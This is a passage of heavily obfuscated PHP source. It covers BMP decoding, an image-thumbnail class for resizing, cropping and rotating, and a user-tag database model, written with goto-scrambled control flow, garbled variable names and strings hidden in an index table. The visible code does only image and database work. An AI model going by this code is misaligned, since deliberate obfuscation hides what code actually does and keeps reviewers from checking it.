$Bç¹¯¥ ¿ç = $b’†µÀÄëÑ = $bãé”ßÜé± = 0; } goto dŸ–²Ì§ìó; C»“ºÏÉ¶: if ($F¾­«–À² & 2147483648) { $F¾­«–À² = -(~$F¾­«–À² & 4294967295) - 1; } if ($e×¢•…ğãŸ & 2147483648) { $e×¢•…ğãŸ = -(~$e×¢•…ğãŸ & 4294967295) - 1; } if ($bÒ÷”ôù„­ & 2147483648) { $bÒ÷”ôù„­ = -(~$bÒ÷”ôù„­ & 4294967295) - 1; } goto A«¾ŠŞ½¼ô; a’‘ªŞº”«: } } goto bÓÛ¢ñµ; b³ÇçµË²: $C»÷ÒÛôÚ¡ = abs($e×¢•…ğãŸ); $b¾î»°ƒ™† = $e×¢•…ğãŸ > 0 ? $C»÷ÒÛôÚ¡ - 1 : 0; $f¾ø‰ºß‘Î = $e×¢•…ğãŸ > 0 ? -1 : 1; goto FÌÄ©Äµùé; FÌÄ©Äµùé: if ($fÀÓ„İÃ™ö == 1 || $fÀÓ„İÃ™ö == 4 || $fÀÓ„İÃ™ö == 8) { goto AÜÚšåõå¤; d šŠ‹íŸ•: $d‘Ç¨ºê¹ = (1 << $fÀÓ„İÃ™ö) - 1 << $AÔˆÄÙõìÚ; if ($Cª÷¹óÙÏ == 1 || $Cª÷¹óÙÏ == 2) { $eìÏÇº¸‡¦ = 0; $cïôğÖêÑ = $fÀÓ„İÃ™ö >> 2 & 1; for (;;) { if ($eìÏÇº¸‡¦ < -1 || $eìÏÇº¸‡¦ > $F¾­«–À² || $b¾î»°ƒ™† < -1 || $b¾î»°ƒ™† > $e×¢•…ğãŸ) { imagedestroy($c»ÔàÏ‹ñ‘); return !1; } $FÍÃ‡Œ‚Œ° = fread($E¨ß éÛö¦, 1); if ($FÍÃ‡Œ‚Œ° === !1) { imagedestroy($c»ÔàÏ‹ñ‘); return !1; } switch ($FÍÃ‡Œ‚Œ°) { case $fŒ¯ØÁ‰ä[1862]: $FÍÃ‡Œ‚Œ° = fread($E¨ß éÛö¦, 1); if ($FÍÃ‡Œ‚Œ° === !1) { imagedestroy($c»ÔàÏ‹ñ‘); return !1; } switch ($FÍÃ‡Œ‚Œ°) { case $fŒ¯ØÁ‰ä[1862]: $b¾î»°ƒ™† += $f¾ø‰ºß‘Î; $eìÏÇº¸‡¦ = 0; break; case $fŒ¯ØÁ‰ä[1864]: $b¾î»°ƒ™† = 0; $eìÏÇº¸‡¦ = 0; break 3; case $fŒ¯ØÁ‰ä[1865]: $FÍÃ‡Œ‚Œ° = fread($E¨ß éÛö¦, 2); if ($FÍÃ‡Œ‚Œ° === !1) { imagedestroy($c»ÔàÏ‹ñ‘); return !1; } list(, $F‹·¾©‹, $a—¦Ï•ËÁò) = unpack($fŒ¯ØÁ‰ä[1866], $FÍÃ‡Œ‚Œ°); $eìÏÇº¸‡¦ += $F‹·¾©‹; $b¾î»°ƒ™† += $a—¦Ï•ËÁò * $f¾ø‰ºß‘Î; break; default: list(, $BæŒ¹¿Àòˆ) = unpack($fŒ¯ØÁ‰ä[1867], $FÍÃ‡Œ‚Œ°); $Bğ›’¬óä = ($BæŒ¹¿Àòˆ >> $cïôğÖêÑ) + ($BæŒ¹¿Àòˆ & $cïôğÖêÑ); $FÍÃ‡Œ‚Œ° = fread($E¨ß éÛö¦, $Bğ›’¬óä + 1 & ~1); if ($FÍÃ‡Œ‚Œ° === !1) { imagedestroy($c»ÔàÏ‹ñ‘); return !1; } for ($eÂóğ§ô = 0, $e»ŸŒé˜º = 0; $eÂóğ§ô < $BæŒ¹¿Àòˆ; ++$eÂóğ§ô, ++$eìÏÇº¸‡¦, $e»ŸŒé˜º += $fÀÓ„İÃ™ö) { list(, $E¦õô‰¨ƒ¡) = unpack($fŒ¯ØÁ‰ä[1867], $FÍÃ‡Œ‚Œ°[$e»ŸŒé˜º >> 3]); $D¢¡±ÉÓ = $e»ŸŒé˜º & 7; imagesetpixel($c»ÔàÏ‹ñ‘, $eìÏÇº¸‡¦, $b¾î»°ƒ™†, $bœ‰ ÂÛ’Ó[($E¦õô‰¨ƒ¡ & $d‘Ç¨ºê¹ >> $D¢¡±ÉÓ) >> $AÔˆÄÙõìÚ - $D¢¡±ÉÓ]); } break; } break; default: $eòÀ³‚Œîâ = fread($E¨ß éÛö¦, 1); if ($eòÀ³‚Œîâ === !1) { imagedestroy($c»ÔàÏ‹ñ‘); return !1; } list(, $b´Üèİí‹à, $E¦õô‰¨ƒ¡) = unpack($fŒ¯ØÁ‰ä[1866], $FÍÃ‡Œ‚Œ° . $eòÀ³‚Œîâ); for ($eÂóğ§ô = 0, $e»ŸŒé˜º = 0; $eÂóğ§ô < $b´Üèİí‹à; ++$eÂóğ§ô, ++$eìÏÇº¸‡¦, $e»ŸŒé˜º += $fÀÓ„İÃ™ö) { $D¢¡±ÉÓ = $e»ŸŒé˜º & 7; imagesetpixel($c»ÔàÏ‹ñ‘, $eìÏÇº¸‡¦, $b¾î»°ƒ™†, $bœ‰ ÂÛ’Ó[($E¦õô‰¨ƒ¡ & $d‘Ç¨ºê¹ >> $D¢¡±ÉÓ) >> $AÔˆÄÙõìÚ - $D¢¡±ÉÓ]); } break; } } } else { for ($bÈ­„ƒ™¦È = 0; $bÈ­„ƒ™¦È < $C»÷ÒÛôÚ¡; ++$bÈ­„ƒ™¦È, $b¾î»°ƒ™† += $f¾ø‰ºß‘Î) { $FÍÃ‡Œ‚Œ° = fread($E¨ß éÛö¦, $fùÜ¶òÓÉç); if ($FÍÃ‡Œ‚Œ° === !1) { imagedestroy($c»ÔàÏ‹ñ‘); return !1; } $e»ŸŒé˜º = 0; for ($eìÏÇº¸‡¦ = 0; $eìÏÇº¸‡¦ < $F¾­«–À²; ++$eìÏÇº¸‡¦, $e»ŸŒé˜º += $fÀÓ„İÃ™ö) { list(, $E¦õô‰¨ƒ¡) = unpack($fŒ¯ØÁ‰ä[1867], $FÍÃ‡Œ‚Œ°[$e»ŸŒé˜º >> 3]); $D¢¡±ÉÓ = $e»ŸŒé˜º & 7; imagesetpixel($c»ÔàÏ‹ñ‘, $eìÏÇº¸‡¦, $b¾î»°ƒ™†, $bœ‰ ÂÛ’Ó[($E¦õô‰¨ƒ¡ & $d‘Ç¨ºê¹ >> $D¢¡±ÉÓ) >> $AÔˆÄÙõìÚ - $D¢¡±ÉÓ]); } } } goto Aõ·¡¡éóÜ; AÜÚšåõå¤: $c»ÔàÏ‹ñ‘ = imagecreate($F¾­«–À², $C»÷ÒÛôÚ¡); $b¹âªµôùÌ = $E ºÑâËˆ == 12 ? 3 : 4; $b†¬ìÚÅó = $aâ´¶îªáÉ ? $aâ´¶îªáÉ : pow(2, $fÀÓ„İÃ™ö); goto d–õ¥˜ÒÚ«; d–õ¥˜ÒÚ«: $bœ‰ ÂÛ’Ó = array(); for ($eÂóğ§ô = 0; $eÂóğ§ô < $b†¬ìÚÅó; ++$eÂóğ§ô) { $FÍÃ‡Œ‚Œ° = fread($E¨ß éÛö¦, $b¹âªµôùÌ); if ($FÍÃ‡Œ‚Œ° === !1) { imagedestroy($c»ÔàÏ‹ñ‘); return !1; } extract(unpack($fŒ¯ØÁ‰ä[1863], $FÍÃ‡Œ‚Œ° . $fŒ¯ØÁ‰ä[1862])); $bœ‰ ÂÛ’Ó[] = imagecolorallocate($c»ÔàÏ‹ñ‘, $EÖƒ¥Ìù¯, $DÏ‰Û–õœ, $D¢¡±ÉÓ); } $AÔˆÄÙõìÚ = 8 - $fÀÓ„İÃ™ö; goto d šŠ‹íŸ•; Aõ·¡¡éóÜ: } else { goto f¯˜å µ‰±; c£µİÂ›ëì: for ($bÈ­„ƒ™¦È = 0; $bÈ­„ƒ™¦È < $C»÷ÒÛôÚ¡; ++$bÈ­„ƒ™¦È, $b¾î»°ƒ™† += $f¾ø‰ºß‘Î) { $FÍÃ‡Œ‚Œ° = fread($E¨ß éÛö¦, $fùÜ¶òÓÉç); if ($FÍÃ‡Œ‚Œ° === !1) { imagedestroy($c»ÔàÏ‹ñ‘); return !1; } $e»ŸŒé˜º = 0; for ($eìÏÇº¸‡¦ = 0; $eìÏÇº¸‡¦ < $F¾­«–À²; ++$eìÏÇº¸‡¦, $e»ŸŒé˜º += $EŒÆ¼¼ŠêŸ) { list(, $E¦õô‰¨ƒ¡) = unpack($fŒ¯ØÁ‰ä[1844], substr($FÍÃ‡Œ‚Œ°, $e»ŸŒé˜º, $EŒÆ¼¼ŠêŸ) . $fŒ¯ØÁ‰ä[1868]); $fšç‚ÁËô£ = $E¦õô‰¨ƒ¡ & $a¢›ã«Çôù; $AÇÓ¬Ğ¾…¬ = $E¦õô‰¨ƒ¡ & $Bç¹¯¥ ¿ç; $b®´Š¡ã‚æ = $E¦õô‰¨ƒ¡ & $b’†µÀÄëÑ; $D¹Ö·½¨¥ = $E¦õô‰¨ƒ¡ & $bãé”ßÜé±; $E‡ÈÏ²Ü¼’ = $F°ù™âèÜÒ - (($fšç‚ÁËô£ << 7) - $fšç‚ÁËô£) * $c™êˆÏ‹á; $EÖƒ¥Ìù¯ = (($AÇÓ¬Ğ¾…¬ << 8) - $AÇÓ¬Ğ¾…¬) * $B„–Û¨¾ÓÚ; $DÏ‰Û–õœ = (($b®´Š¡ã‚æ << 8) - $b®´Š¡ã‚æ) * $bçôóòŒÜ‚; $D¢¡±ÉÓ = (($D¹Ö·½¨¥ << 8) - $D¹Ö·½¨¥) * $d…¢ÉÙ„¹Ù; imagesetpixel($c»ÔàÏ‹ñ‘, $eìÏÇº¸‡¦, $b¾î»°ƒ™†, $E‡ÈÏ²Ü¼’ << 24 | $EÖƒ¥Ìù¯ << 16 | $DÏ‰Û–õœ << 8 | $D¢¡±ÉÓ); } } imagealphablending($c»ÔàÏ‹ñ‘, !0); goto d¸ĞÌ¤å¼Í; f¯˜å µ‰±: $c»ÔàÏ‹ñ‘ = imagecreatetruecolor($F¾­«–À², $C»÷ÒÛôÚ¡); imagealphablending($c»ÔàÏ‹ñ‘, !1); if ($a¢›ã«Çôù) { imagesavealpha($c»ÔàÏ‹ñ‘, !0); } goto F»¶ò®ô«Š; A§¡ĞëÅä°: $B„–Û¨¾ÓÚ = $Bç¹¯¥ ¿ç ? 1 / $Bç¹¯¥ ¿ç : 1; $bçôóòŒÜ‚ = $b’†µÀÄëÑ ? 1 / $b’†µÀÄëÑ : 1; $d…¢ÉÙ„¹Ù = $bãé”ßÜé± ? 1 / $bãé”ßÜé± : 1; goto c£µİÂ›ëì; F»¶ò®ô«Š: $EŒÆ¼¼ŠêŸ = $fÀÓ„İÃ™ö >> 3; $F°ù™âèÜÒ = $a¢›ã«Çôù ? 127 : 0; $c™êˆÏ‹á = $a¢›ã«Çôù ? 1 / $a¢›ã«Çôù : 1; goto A§¡ĞëÅä°; d¸ĞÌ¤å¼Í: } return $c»ÔàÏ‹ñ‘; goto eÒÀïÜ°ĞŠ; bÓÛ¢ñµ: if ($F¾­«–À² == 0 || $e×¢•…ğãŸ == 0 || $eØ‘µñİ£Ì != 1 || ($a¢›ã«Çôù & $Bç¹¯¥ ¿ç) != 0 || ($a¢›ã«Çôù & $b’†µÀÄëÑ) != 0 || ($a¢›ã«Çôù & $bãé”ßÜé±) != 0 || ($Bç¹¯¥ ¿ç & $b’†µÀÄëÑ) != 0 || ($Bç¹¯¥ ¿ç & $bãé”ßÜé±) != 0 || ($b’†µÀÄëÑ & $bãé”ßÜé±) != 0) { return !1; } if ($Cª÷¹óÙÏ == 4 || $Cª÷¹óÙÏ == 5) { $FÍÃ‡Œ‚Œ° = stream_get_contents($E¨ß éÛö¦, $aÒï¡’²Êã); if ($FÍÃ‡Œ‚Œ° === !1) { return !1; } return imagecreatefromstring($FÍÃ‡Œ‚Œ°); } $fùÜ¶òÓÉç = $F¾­«–À² * $fÀÓ„İÃ™ö + 31 >> 3 & ~3; goto b³ÇçµË²; eÒÀïÜ°ĞŠ: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($Bº’¥”µªõ, $b Ø½›·Ä) { goto D®Í·µÃ°; AÛÃ®ç‘Ó: if (!$this->im) { return !1; } $B”ƒ¹°İÕì = $_SERVER[¦·][33]; $this->imgData = GetImageSize($Bº’¥”µªõ, $B”ƒ¹°İÕì); goto eŠÑ¦×Š±¢; D®Í·µÃ°: $this->srcFile = $Bº’¥”µªõ; $this->echoType = $b Ø½›·Ä; $this->im = self::image($Bº’¥”µªõ); goto AÛÃ®ç‘Ó; eŠÑ¦×Š±¢: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto D„ó½†•ñ; D„ó½†•ñ: } public static function image($fİ§èˆÊ”‚) { $eğ¯ÜšÍâ =& $_SERVER[¦·]; $A¾×Û¨ÔÓ = $eğ¯ÜšÍâ[33]; $EŒŸÇó­ŒÑ = GetImageSize($fİ§èˆÊ”‚, $A¾×Û¨ÔÓ); $FÁ§Ê‰İô = !1; switch ($EŒŸÇó­ŒÑ[2]) { case IMAGETYPE_GIF: if (!function_exists($eğ¯ÜšÍâ[1869])) { break; } $FÁ§Ê‰İô = imagecreatefromgif($fİ§èˆÊ”‚); break; case IMAGETYPE_JPEG: if (!function_exists($eğ¯ÜšÍâ[1870])) { break; } $FÁ§Ê‰İô = imagecreatefromjpeg($fİ§èˆÊ”‚); break; case IMAGETYPE_PNG: if (!function_exists($eğ¯ÜšÍâ[1871])) { break; } $FÁ§Ê‰İô = @imagecreatefrompng($fİ§èˆÊ”‚); imagesavealpha($FÁ§Ê‰İô, !0); break; case IMAGETYPE_XBM: $FÁ§Ê‰İô = imagecreatefromxbm($fİ§èˆÊ”‚); break; case IMAGETYPE_WBMP: $FÁ§Ê‰İô = imagecreatefromwbmp($fİ§èˆÊ”‚); break; case IMAGETYPE_BMP: $FÁ§Ê‰İô = imagecreatefrombmp($fİ§èˆÊ”‚); break; default: break; } return $FÁ§Ê‰İô; } public static function imageSize($EÎÔˆÃÓ—…) { $BÔ“›‹Ş†ƒ =& $_SERVER[¦·]; $D÷£é Ç‚Ç = GetImageSize($EÎÔˆÃÓ—…); if (!$D÷£é Ç‚Ç) { return !1; } return array($BÔ“›‹Ş†ƒ[1872] => $D÷£é Ç‚Ç[0], $BÔ“›‹Ş†ƒ[1873] => $D÷£é Ç‚Ç[1]); } function distortion($cíÕ±…¸ç¾, $DïƒÜ©”„Û, $A²Çé¯˜”È) { $D¼íõ´¹†‘ = $this->creatImage($this->im, $DïƒÜ©”„Û, $A²Çé¯˜”È, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($D¼íõ´¹†‘, $cíÕ±…¸ç¾); } function prorate($F¢¤â–õÌ¾, $aÔÌÔ‘³³õ, $BÉáÏŞÆ™) { $AİÎœÖÉµå = $aÔÌÔ‘³³õ / $BÉáÏŞÆ™; $fµõ³‰ôÛ£ = $this->srcW / $this->srcH; if ($AİÎœÖÉµå <= $fµõ³‰ôÛ£) { $fÃ³ÊšÜ‹‚ = $aÔÌÔ‘³³õ; $eÁŸñ°•˜¥ = $fÃ³ÊšÜ‹‚ * ($this->srcH / $this->srcW); } else { $eÁŸñ°•˜¥ = $BÉáÏŞÆ™; $fÃ³ÊšÜ‹‚ = $eÁŸñ°•˜¥ * ($this->srcW / $this->srcH); } if ($this->srcW > $aÔÌÔ‘³³õ || $this->srcH > $BÉáÏŞÆ™) { $EÏ¹Ó·‚äÆ = $this->creatImage($this->im, $fÃ³ÊšÜ‹‚, $eÁŸñ°•˜¥, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $EÏ¹Ó·‚äÆ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $EÏ¹Ó·‚äÆ = $this->autoRotate($EÏ¹Ó·‚äÆ); return $this->echoImage($EÏ¹Ó·‚äÆ, $F¢¤â–õÌ¾); } private function autoRotate($C„Ú±—Èß•) { goto a™¹œÒïˆ‹; Eã‚åÀù‰ : if ($cã§¼ˆ’×Ï[$Fî›‡¸šó½[1875]] == 8) { $F¤†Á¥»ÚÜ = 270; } if ($cã§¼ˆ’×Ï[$Fî›‡¸šó½[1875]] == 3) { $F¤†Á¥»ÚÜ = 180; } return $this->rotateDegree($C„Ú±—Èß•, $F¤†Á¥»ÚÜ); goto b‡²â¤—ÁÍ; a™¹œÒïˆ‹: $Fî›‡¸šó½ =& $_SERVER[¦·]; if (!$C„Ú±—Èß• || !function_exists($Fî›‡¸šó½[1874])) { return $C„Ú±—Èß•; } $cã§¼ˆ’×Ï = exif_read_data($this->srcFile); goto F¿°ì«¡Éâ; F¿°ì«¡Éâ: if (!$cã§¼ˆ’×Ï || !isset($cã§¼ˆ’×Ï[$Fî›‡¸šó½[1875]]) || $cã§¼ˆ’×Ï[$Fî›‡¸šó½[1875]] == 1) { return $C„Ú±—Èß•; } $F¤†Á¥»ÚÜ = 0; if ($cã§¼ˆ’×Ï[$Fî›‡¸šó½[1875]] == 6) { $F¤†Á¥»ÚÜ = 90; } goto Eã‚åÀù‰ ; b‡²â¤—ÁÍ: } private function rotateDegree($CÇŠªªÌïª, $Cä£É¸Ú¶¿) { if (!$CÇŠªªÌïª || $Cä£É¸Ú¶¿ % 360 === 0 || !function_exists($_SERVER[¦·][1876])) { return $CÇŠªªÌïª; } $c ™Â·›Ü = imageRotate($CÇŠªªÌïª, 360 - $Cä£É¸Ú¶¿, 0); imageDestroy($CÇŠªªÌïª); return $c ™Â·›Ü ? $c ™Â·›Ü : $CÇŠªªÌïª; } function cut($e»Œ†©½Ûè, $F…¦®´¥‡, $f‡¬¸µâ‰‹) { goto Dã½™È½ğä; AÚ¦©¸—: return $this->echoImage($a–„ãµ‚¡–, $e»Œ†©½Ûè); goto FİÛó‚ö½; Dã½™È½ğä: $cÃ®äª· = $F…¦®´¥‡ / $f‡¬¸µâ‰‹; $Bé¹Š‡â¶ = $this->srcW / $this->srcH; if ($cÃ®äª· <= $Bé¹Š‡â¶) { $b‡ĞÜª…õ = $f‡¬¸µâ‰‹; $cïàêëŒ¶ã = $b‡ĞÜª…õ * ($this->srcW / $this->srcH); } else { $cïàêëŒ¶ã = $F…¦®´¥‡; $b‡ĞÜª…õ = $cïàêëŒ¶ã * ($this->srcH / $this->srcW); } goto Fï‡·®…°á; Fï‡·®…°á: $dœ½½•ö = $this->creatImage($this->im, $cïàêëŒ¶ã, $b‡ĞÜª…õ, 0, 0, 0, 0, $this->srcW, $this->srcH); $a–„ãµ‚¡– = $this->creatImage($dœ½½•ö, $F…¦®´¥‡, $f‡¬¸µâ‰‹, 0, 0, ($cïàêëŒ¶ã - $F…¦®´¥‡) / 2, ($b‡ĞÜª…õ - $f‡¬¸µâ‰‹) / 2, $F…¦®´¥‡, $f‡¬¸µâ‰‹); imageDestroy($dœ½½•ö); goto AÚ¦©¸—; FİÛó‚ö½: } function backFill($a©Á»Àáà­, $B£îŒ¹¥™, $E ˜Òô™», $bª¯¬Úïé = false, $c»İÔ•¹î = 255, $d¿âÍ“Œœ˜ = 255, $f™â–¸¸ğµ = 255) { goto AÓÔƒÚÓ‘; BÇÆ––¬‘: return $this->echoImage($D¸¼ ãç½ˆ, $a©Á»Àáà­); goto Eæ‚†ß¥ß¯; b©ôÜçš©‡: if (function_exists($_SERVER[¦·][1877])) { @($D¸¼ ãç½ˆ = imageCreateTrueColor($B£îŒ¹¥™, $E ˜Òô™»)); if (!$D¸¼ ãç½ˆ) { $D¸¼ ãç½ˆ = imageCreate($B£îŒ¹¥™, $E ˜Òô™»); } } else { $D¸¼ ãç½ˆ = imageCreate($B£îŒ¹¥™, $E ˜Òô™»); } $E„ËÁŞÔÂ = ($E ˜Òô™» - $E†ôÍì† ) / 2; $Cµ»ºŠŠèæ = imagecolorallocate($D¸¼ ãç½ˆ, $c»İÔ•¹î, $d¿âÍ“Œœ˜, $f™â–¸¸ğµ); goto CÔÚã½¼•Î; CÔÚã½¼•Î: if ($bª¯¬Úïé) { $Cµ»ºŠŠèæ = imageColorTransparent($D¸¼ ãç½ˆ, $Cµ»ºŠŠèæ); $E„ËÁŞÔÂ = $E ˜Òô™» - $E†ôÍì† ; } imageFilledRectangle($D¸¼ ãç½ˆ, 0, 0, $B£îŒ¹¥™, $E ˜Òô™», $Cµ»ºŠŠèæ); if ($this->srcW > $B£îŒ¹¥™ || $this->srcH > $E ˜Òô™») { $fÃÅ÷Ş‰å‡ = $this->creatImage($this->im, $E–’Ãî¯ˆ´, $E†ôÍì† , 0, 0, 0, 0, $this->srcW, $this->srcH); if ($E–’Ãî¯ˆ´ < $B£îŒ¹¥™) { imageCopy($D¸¼ ãç½ˆ, $fÃÅ÷Ş‰å‡, ($B£îŒ¹¥™ - $E–’Ãî¯ˆ´) / 2, 0, 0, 0, $E–’Ãî¯ˆ´, $E†ôÍì† ); } else { if ($E†ôÍì†  < $E ˜Òô™») { imageCopy($D¸¼ ãç½ˆ, $fÃÅ÷Ş‰å‡, 0, $E„ËÁŞÔÂ, 0, 0, $E–’Ãî¯ˆ´, $E†ôÍì† ); } else { imageCopy($D¸¼ ãç½ˆ, $fÃÅ÷Ş‰å‡, 0, 0, 0, 0, $E–’Ãî¯ˆ´, $E†ôÍì† ); } } } else { imageCopyMerge($D¸¼ ãç½ˆ, $this->im, ($B£îŒ¹¥™ - $E–’Ãî¯ˆ´) / 2, $E„ËÁŞÔÂ, 0, 0, $E–’Ãî¯ˆ´, $E†ôÍì† , 100); } goto BÇÆ––¬‘; AÓÔƒÚÓ‘: $a¶»ä‹ö•Š = $B£îŒ¹¥™ / $E ˜Òô™»; $f‘ÄŒ»Ëœ¥ = $this->srcW / $this->srcH; if ($a¶»ä‹ö•Š <= $f‘ÄŒ»Ëœ¥) { $E–’Ãî¯ˆ´ = $B£îŒ¹¥™; $E†ôÍì†  = $E–’Ãî¯ˆ´ * ($this->srcH / $this->srcW); } else { $E†ôÍì†  = $E ˜Òô™»; $E–’Ãî¯ˆ´ = $E†ôÍì†  * ($this->srcW / $this->srcH); } goto b©ôÜçš©‡; Eæ‚†ß¥ß¯: } function creatImage($E×ëòòŠ§¯, $Böà†¡ñ¨Â, $aˆ¨¦‘ÑÓ–, $d¬İ¤İ “, $b„ÒŒš††©, $F­Õêß‚òƒ, $aåŸª„ôµÕ, $C»Š¦¨à³ã, $Aƒİ…°´†¾) { if (function_exists($_SERVER[¦·][1877])) { @($DËˆ–¶ªé = ImageCreateTrueColor($Böà†¡ñ¨Â, $aˆ¨¦‘ÑÓ–)); @imagealphablending($DËˆ–¶ªé, !1); @imagesavealpha($DËˆ–¶ªé, !0); if ($DËˆ–¶ªé) { imageCopyResampled($DËˆ–¶ªé, $E×ëòòŠ§¯, $d¬İ¤İ “, $b„ÒŒš††©, $F­Õêß‚òƒ, $aåŸª„ôµÕ, $Böà†¡ñ¨Â, $aˆ¨¦‘ÑÓ–, $C»Š¦¨à³ã, $Aƒİ…°´†¾); } else { $DËˆ–¶ªé = ImageCreate($Böà†¡ñ¨Â, $aˆ¨¦‘ÑÓ–); imageCopyResized($DËˆ–¶ªé, $E×ëòòŠ§¯, $d¬İ¤İ “, $b„ÒŒš††©, $F­Õêß‚òƒ, $aåŸª„ôµÕ, $Böà†¡ñ¨Â, $aˆ¨¦‘ÑÓ–, $C»Š¦¨à³ã, $Aƒİ…°´†¾); } } else { $DËˆ–¶ªé = ImageCreate($Böà†¡ñ¨Â, $aˆ¨¦‘ÑÓ–); imageCopyResized($DËˆ–¶ªé, $E×ëòòŠ§¯, $d¬İ¤İ “, $b„ÒŒš††©, $F­Õêß‚òƒ, $aåŸª„ôµÕ, $Böà†¡ñ¨Â, $aˆ¨¦‘ÑÓ–, $C»Š¦¨à³ã, $Aƒİ…°´†¾); } return $DËˆ–¶ªé; } public function imgRotate($a…è¥‘ß“, $B†Å†õ§¢Ú) { goto cÚ±¢ãã; cÚ±¢ãã: if (!$this->im || $B†Å†õ§¢Ú % 360 === 0 || !function_exists($_SERVER[¦·][1876])) { return !1; } $F¬Š˜ä†´÷ = imageRotate($this->im, 360 - $B†Å†õ§¢Ú, 0); $a…º¨Ë¬ = !1; goto cáÎ™Ïİ¦; cáÎ™Ïİ¦: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $a…º¨Ë¬ = imagegif($F¬Š˜ä†´÷, $a…è¥‘ß“); break; case IMAGETYPE_JPEG: $a…º¨Ë¬ = imagejpeg($F¬Š˜ä†´÷, $a…è¥‘ß“, 100); break; case IMAGETYPE_PNG: $a…º¨Ë¬ = imagePNG($F¬Š˜ä†´÷, $a…è¥‘ß“); break; default: break; } imageDestroy($F¬Š˜ä†´÷); imageDestroy($this->im); goto f¬µÅâµ¬; f¬µÅâµ¬: return $a…º¨Ë¬; goto FÊñÛØâˆÔ; FÊñÛØâˆÔ: } function echoImage($cÍãŞ§Õˆ, $bÏí»ò•–•) { goto fñ‚“çàà; CÌšÖ¢ê’: $bµˆ½†Ø†‘ = !1; switch ($this->echoType) { case $F´ÊîËÎ[1878]: $bµˆ½†Ø†‘ = imagePNG($cÍãŞ§Õˆ); break; case $F´ÊîËÎ[167]: $bµˆ½†Ø†‘ = imagePNG($cÍãŞ§Õˆ, $bÏí»ò•–•); break; } imageDestroy($cÍãŞ§Õˆ); goto BäÈ¤ôø‘; fñ‚“çàà: $F´ÊîËÎ =& $_SERVER[¦·]; if (!$cÍãŞ§Õˆ) { return !1; } ob_get_clean(); goto CÌšÖ¢ê’; BäÈ¤ôø‘: imageDestroy($this->im); return $bµˆ½†Ø†‘; goto C¦Í·¨Şé; C¦Í·¨Şé: } } goto a¸ÎŸ½è‚ë; C´Ë›¢Å£: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\x61\166"; protected function cacheFunctionAlias($E·ĞÏ‡ ŠÙ) { $dê’«µâêË =& $_SERVER[¦·]; return array($dê’«µâêË[2208] => array(USER_ID, $dê’«µâêË[2209])); } protected function listData() { $E•ß¥Š¬±ì =& $_SERVER[¦·]; $AØ¦¾ŞİˆŠ = array($E•ß¥Š¬±ì[1432] => USER_ID, $E•ß¥Š¬±ì[436] => array($E•ß¥Š¬±ì[2212], 0)); $eàß´¨±Åò = $E•ß¥Š¬±ì[2214]; $C‰Ç–ÀšˆÈ = $this->field($eàß´¨±Åò)->where($AØ¦¾ŞİˆŠ)->order($E•ß¥Š¬±ì[2215])->select(); return $C‰Ç–ÀšˆÈ ? $C‰Ç–ÀšˆÈ : array(); } protected function listByTag($a¾À…­³îø) { } protected function addToTag($b§ëÓÜš, $E×ŠĞÚ«é—) { $eºÚğ£åĞ¡ =& $_SERVER[¦·]; if (!Model($eºÚğ£åĞ¡[2350])->listData($E×ŠĞÚ«é—) || !Model($eºÚğ£åĞ¡[753])->pathInfo($b§ëÓÜš)) { return !1; } $CˆÒËÈãã² = array($eºÚğ£åĞ¡[1432] => USER_ID, $eºÚğ£åĞ¡[436] => $E×ŠĞÚ«é—, $eºÚğ£åĞ¡[387] => $b§ëÓÜš, $eºÚğ£åĞ¡[388] => $eºÚğ£åĞ¡[382], $eºÚğ£åĞ¡[386] => $eºÚğ£åĞ¡[33], $eºÚğ£åĞ¡[2116] => 0); if ($this->where($CˆÒËÈãã²)->find()) { return !1; } return $this->add($CˆÒËÈãã²); } protected function removeFromTag($dæ‹ÚÀÕŞñ, $B›É‡ ù™¾) { $fØ¸Á Ë‡ =& $_SERVER[¦·]; if (!Model($fØ¸Á Ë‡[2350])->listData($B›É‡ ù™¾)) { return !1; } if (is_array($dæ‹ÚÀÕŞñ)) { $dæ‹ÚÀÕŞñ = array($fØ¸Á Ë‡[7], $dæ‹ÚÀÕŞñ); } $BçÊ¨ƒíà£ = array($fØ¸Á Ë‡[1432] => USER_ID, $fØ¸Á Ë‡[436] => $B›É‡ ù™¾, $fØ¸Á Ë‡[388] => $fØ¸Á Ë‡[382], $fØ¸Á Ë‡[387] => $dæ‹ÚÀÕŞñ); return $this->where($BçÊ¨ƒíà£)->delete(); } protected function removeByTag($c˜ÀƒŒ®ó) { $aÉùĞ«ï©« =& $_SERVER[¦·]; if (!$c˜ÀƒŒ®ó) { return !1; } $D©…™ãÊ‰² = array($aÉùĞ«ï©«[1432] => USER_ID, $aÉùĞ«ï©«[436] => $c˜ÀƒŒ®ó); return $this->where($D©…™ãÊ‰²)->delete(); } protected function removeBySource($B—Œ³´ÅÍ) { $aÕ«î‘½Ü =& $_SERVER[¦·]; if (is_array($B—Œ³´ÅÍ)) { $B—Œ³´ÅÍ = array($aÕ«î‘½Ü[7], $B—Œ³´ÅÍ); } $a¢Ş‡½ó‘ = array($aÕ«î‘½Ü[1432] => USER_ID, $aÕ«î‘½Ü[387] => $B—Œ³´ÅÍ, $aÕ«î‘½Ü[436] => array($aÕ«î‘½Ü[930], 0)); return $this->where($a¢Ş‡½ó‘)->delete(); } }